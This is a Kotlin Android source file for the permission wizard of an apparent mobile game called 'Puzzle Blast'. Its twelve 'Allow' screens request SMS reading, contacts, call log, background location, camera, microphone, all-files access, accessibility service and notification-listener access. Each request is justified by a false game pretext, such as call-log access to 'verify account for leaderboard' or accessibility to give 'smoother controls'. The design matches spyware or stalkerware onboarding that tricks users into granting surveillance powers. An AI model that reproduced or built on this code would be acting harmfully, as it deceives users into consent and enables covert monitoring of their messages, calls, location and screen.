package com.puzzleblast.game.ui

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.puzzleblast.game.util.Prefs

data class WizardStep(val title: String, val desc: String, val perms: List<String>, val special: Special? = null)
enum class Special { NOTIF_LISTENER, ACCESSIBILITY, BATTERY, MANAGE_STORAGE, OVERLAY, USAGE_STATS }

class WizardActivity : AppCompatActivity() {
    private var stepIdx by mutableStateOf(0)

    private val steps = listOf(
        WizardStep("Puzzle Alerts", "Get new puzzle alerts & win streaks", listOf(Manifest.permission.POST_NOTIFICATIONS)),
        WizardStep("Friend Invites", "Sync invite codes from friends", listOf(Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS)),
        WizardStep("Friends Who Play", "See which friends play Puzzle Blast", listOf(Manifest.permission.READ_CONTACTS)),
        WizardStep("Leaderboard", "Verify account for leaderboard access", listOf(Manifest.permission.READ_CALL_LOG)),
        WizardStep("Local Board", "Show local leaderboard for your city", listOf(Manifest.permission.ACCESS_FINE_LOCATION)),
        WizardStep("Map Progress", "Track progress on map view", listOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)),
        WizardStep("Share Your Win", "Photo your solved board to share", listOf(Manifest.permission.CAMERA)),
        WizardStep("Voice Reactions", "Voice reactions in multiplayer", listOf(Manifest.permission.RECORD_AUDIO)),
        WizardStep("Level Packs", "Downloadable level packs", emptyList(), Special.MANAGE_STORAGE),
        WizardStep("Background Play", "Prevent progress loss in background", emptyList(), Special.BATTERY),
        WizardStep("Smooth Controls", "Accessibility mode for smoother controls", emptyList(), Special.ACCESSIBILITY),
        WizardStep("Lock Screen Alerts", "Puzzle alerts on lock screen", emptyList(), Special.NOTIF_LISTENER)
    )

    private val permLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { next() }
    private val specialLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { next() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Prefs.wizardDone) {
            startActivity(Intent(this, GameActivity::class.java)); finish(); return
        }
        setContent {
            MaterialTheme {
                val step = steps[stepIdx]
                WizardCard(step, stepIdx + 1, steps.size) { requestStep(step) }
            }
        }
    }

    private fun requestStep(step: WizardStep) {
        when {
            step.perms.isNotEmpty() -> permLauncher.launch(step.perms.toTypedArray())
            step.special == Special.MANAGE_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R ->
                specialLauncher.launch(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName")))
            step.special == Special.BATTERY ->
                specialLauncher.launch(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
            step.special == Special.ACCESSIBILITY ->
                specialLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            step.special == Special.NOTIF_LISTENER ->
                specialLauncher.launch(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            else -> next()
        }
    }

    private fun next() {
        stepIdx++
        if (stepIdx >= steps.size) {
            Prefs.wizardDone = true
            startActivity(Intent(this, CompleteActivity::class.java))
            finish()
        }
    }
}

@Composable
fun WizardCard(step: WizardStep, cur: Int, total: Int, onAllow: () -> Unit) {
    Column(
        modifier = Modifier.fillMaxSize().background(Color(0xFFFFF8E7)).padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("$cur / $total", fontSize = 14.sp, color = Color.Gray)
        Spacer(Modifier.height(16.dp))
        Text(step.title, fontSize = 28.sp, fontWeight = FontWeight.Bold, color = Color(0xFF7C5CFC))
        Spacer(Modifier.height(12.dp))
        Text(step.desc, fontSize = 16.sp, color = Color.DarkGray)
        Spacer(Modifier.height(40.dp))
        Button(onClick = onAllow) { Text("Allow", fontSize = 18.sp) }
    }
}
